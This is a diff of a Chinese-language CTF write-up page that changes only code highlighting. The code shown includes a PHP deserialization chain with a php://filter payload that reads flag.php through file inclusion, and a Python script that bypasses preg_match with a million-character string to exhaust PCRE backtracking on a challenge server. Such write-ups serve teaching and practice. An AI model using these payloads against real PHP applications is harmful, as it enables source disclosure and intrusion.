@@ -532,33 +532,33 @@
 <p>5.A中属性var_1是我们要包含的文件；最后利用文件包含漏洞</p>
 <p>这里利用php://filter和文件包含漏洞来读取flag.php文件</p>
 <p>上序列化代码</p>
-<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
-class A
-{
-    public $var_1;
-}
-class B
-{
-    public $q;
-}
-class C
-{
-    public $var;
-    public $z;
-}
-class D
-{
-    public $p;
-}
-$b = new B();
-$c = new C();
-$d = new D();
-$a = new A();
-$a-&gt;var_1 = "php://filter/read=convert.base64-encode/resource=flag.php";
-$d-&gt;p = $a;
-$c-&gt;z = $d;
-$b-&gt;q = $c;
-echo serialize($b);</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">var_1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span>
+<span class="token variable">$d</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token variable">$c</span><span class="token operator">-&gt;</span><span class="token property">z</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">q</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
 
 <p>执行上面代码得到序列化字符串</p>
 <pre class="language-reStructuredText" data-language="reStructuredText"><code class="language-reStructuredText">O:1:"B":1:{s:1:"q";O:1:"C":2:{s:3:"var";N;s:1:"z";O:1:"D":1:{s:1:"p";O:1:"A":1:{s:5:"var_1";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}}</code></pre>
@@ -585,15 +585,15 @@ echo serialize($b);</code></pre>
 <p>看看大佬p神的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PRCE回溯攻击</a></p>
 <p>总之一句话：超长字符串引发php安全机制，从而绕过preg_match 函数</p>
 <p>上python脚本自动构造超长字符(好好好，这题c_ode长度达到了1000000的级别才行)</p>
-<pre class="language-python" data-language="python"><code class="language-python">import requests
-#pip 安装一下库
-#改成自己题目的url
-url="http://112.6.51.212:30932/"
-data={
-    "c_ode":"s"*1000000+"2023SHCTF"
-}
-res=requests.post(url+"?num[]=1",data).text
-print(res)</code></pre>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token comment">#pip 安装一下库</span>
+<span class="token comment">#改成自己题目的url</span>
+url<span class="token operator">=</span><span class="token string">"http://112.6.51.212:30932/"</span>
+data<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">"c_ode"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token operator">*</span><span class="token number">1000000</span><span class="token operator">+</span><span class="token string">"2023SHCTF"</span>
+<span class="token punctuation">}</span>
+res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?num[]=1"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre>
 
 <p>运行代码，最后得到flag</p>
 <img src="/img/10-3/22.png">
